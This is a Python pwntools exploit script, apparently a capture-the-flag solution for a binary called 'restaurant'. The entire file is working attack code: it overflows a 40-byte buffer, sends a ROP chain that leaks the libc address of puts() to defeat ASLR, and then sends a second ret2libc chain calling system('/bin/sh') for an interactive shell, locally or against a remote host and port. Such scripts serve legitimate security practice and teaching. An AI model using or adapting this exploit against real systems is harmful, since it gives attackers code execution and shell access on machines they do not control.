from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './restaurant'
libc_library = './libc.so.6'
elf = context.binary = ELF(exe, checksec=False)
libc = context.binary = ELF(libc_library, checksec=False)
context.log_level = 'debug'

sh = start()

offsetRsp = b'A' * 40

### 1ST PAYLOAD

rop = ROP(elf) 
rop.call(elf.plt['puts'], [next(elf.search(b''))])

rop.call(elf.plt['puts'], [elf.got['puts']])

# for stack alignment (must align to 16 bytes)
rop.call((rop.find_gadget(['ret']))[0]) 
#print(rop.dump()) # to see the alignment

# goes back to fill(), so we can setup our next ROP
rop.call(elf.sym['fill']) 

# combine into usable payload
ropGetlibcaslr_addr = offsetRsp + rop.chain()
log.info(rop.dump())

sh.sendlineafter(b'>', b'1')
# exploit the vuln to print out the ASLR addr of puts() for libc in the server
sh.sendlineafter(b'>', ropGetlibcaslr_addr) 

# ignore empty space printed to us
sh.recvuntil(b'\n')
# ignore the 1st line statement printed to use as is 
# by the program to tell us "Enjoy your <input value>" before reaching RET
sh.recvuntil(b'\n') 

# get the leaked address of ASLR puts()
leakedputsLibc = u64(sh.recvuntil(b'\n').strip().ljust(8, b'\x00'))
info('Server libc, puts() addr: %#x', leakedputsLibc)

serverLibcbase_addr = leakedputsLibc - libc.symbols['puts']
info('Server libc base addr: %#x', serverLibcbase_addr)

libc.address = serverLibcbase_addr

### 2ND PAYLOAD - craft sys call to /bin/sh

ropLibc = ROP(libc)
ropLibc.call((ropLibc.find_gadget(['ret']))[0]) # align stack (16 bytes)
ropLibc.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])

# combine into usable payload
ropGetbash = offsetRsp + ropLibc.chain()
log.info(ropLibc.dump())

### GET SHELL
sh.sendlineafter(b'>', ropGetbash)
sh.interactive()
